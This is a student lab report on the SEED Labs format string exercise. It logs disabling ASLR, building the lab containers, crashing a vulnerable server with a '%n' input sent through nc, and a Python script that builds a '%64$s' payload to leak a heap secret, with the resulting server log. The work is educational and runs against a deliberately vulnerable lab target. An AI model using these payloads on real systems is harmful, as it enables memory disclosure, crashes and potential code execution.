# Format String Lab

## Introduction

In this week’s lab, our group focused on the Format String Attack exercise from SEED Labs. The primary goal of our work was to demonstrate how unsafe use of format strings (for example, passing user-controlled data directly to `printf`) can be abused to read and write a memory program, potentially enabling arbitrary code execution or privilege escalation.
For this exercise we followed the SEED tutorial and used the provided auxiliary files located in the `category-software/Format_String` directory of the SEED Labs repository on GitHub.
The report that follows documents command-by-command logs, payloads, debugger sessions, and explanations of why each vulnerability works at the OS level.

---

## Setup

We used the command `sudo sysctl -w kernel.randomize_va_space=0` to temporarily disables ASLR (Address Space Layout Randomization), making stack/heap addresses predictable to simplify exploit reproduction.

After that we went to the `Labsetup/server-code` and used these 2 commands

1. `make`
2. `make install`

We wanted compile the code, by executing the commands in the `Makefile`
We finded warning in the process but the SEED Lab said we can ignore that warning by now.

To finish the setup i tested commands:

- `dcbuild`
- `dcup`

To build and start the containers

## Task 1

We sended a string to the server runnning in 32-bit program with the Format String vulnerability with the command `echo hello | nc 10.9.0.5 9090` and then finished the comando by pressing `ctrl + c`

To crash the myprintf() function, we just used `echo "%n" | nc 10.9.0.5 9090`, because the `%n`tells printf to write to a pointer but without an argument, it writes to a random address, causing a crash.

But i could have use `python3 build_string.py` to create a file with the name `badfile`, then i would use the command `cat badfile | nc 10.9.0.5 9090` to have the same results, the myprintf() functio would crash

## Task 2.b

The objetive of this task its print a secret string that lives on the heap.

First i finded the secret message's address in the server log `server-10.9.0.5 | The secret message's address:  0x080b4008`, now i needed that in the Little-Endian format, that i got it by the code the lab disponibilized
```python
#!/usr/bin/python3
import sys

# Initialize the content array
N = 1500
content = bytearray(0x0 for i in range(N))

# This line shows how to store a 4-byte integer at offset 0
number  = 0xbfffeeee
content[0:4]  =  (number).to_bytes(4,byteorder='little')

# This line shows how to store a 4-byte string at offset 4
content[4:8]  =  ("abcd").encode('latin-1')

# This line shows how to construct a string s with
#   12 of "%.8x", concatenated with a "%n"
s = "%.8x"*12 + "%n"

# The line shows how to store the string s at offset 8
fmt  = (s).encode('latin-1')
content[8:8+len(fmt)] = fmt

# Write the content to badfile
with open('badfile', 'wb') as f:
  f.write(content)
```

*But i modified it a little, to do what i needed*

```python
#!/usr/bin/python3
import sys

# Initialize the content array
N = 1500
content = bytearray(0x0 for i in range(N))

secret_address = 0x080b4008

(little-endian)
content[0:4] = (secret_address).to_bytes(4, byteorder='little')

# Format String
s = "%64$s"

fmt = (s).encode('latin-1')
content[4:4+len(fmt)] = fmt

# Write the content to stdout (to use with a pipe)
sys.stdout.buffer.write(content)
```

And then we used the comando `python3 2b.py | nc 10.9.0.5 9090`, and got
```terminal
server-10.9.0.5 | Got a connection from 10.9.0.1
server-10.9.0.5 | Starting format
server-10.9.0.5 | The input buffer's address:    0xffffd0c0
server-10.9.0.5 | The secret message's address:  0x080b4008
server-10.9.0.5 | The target variable's address: 0x080e5068
server-10.9.0.5 | Waiting for user input ......
server-10.9.0.5 | Received 1500 bytes.
server-10.9.0.5 | Frame Pointer (inside myprintf):      0xffffcfe8
server-10.9.0.5 | The target variable's value (before): 0x11223344
server-10.9.0.5 |@
                 A secret message
server-10.9.0.5 | The target variable's value (after):  0x11223344
server-10.9.0.5 | (^_^)(^_^)  Returned properly (^_^)(^_^)
```
And here we go, we got the secret message, its "A secret message"
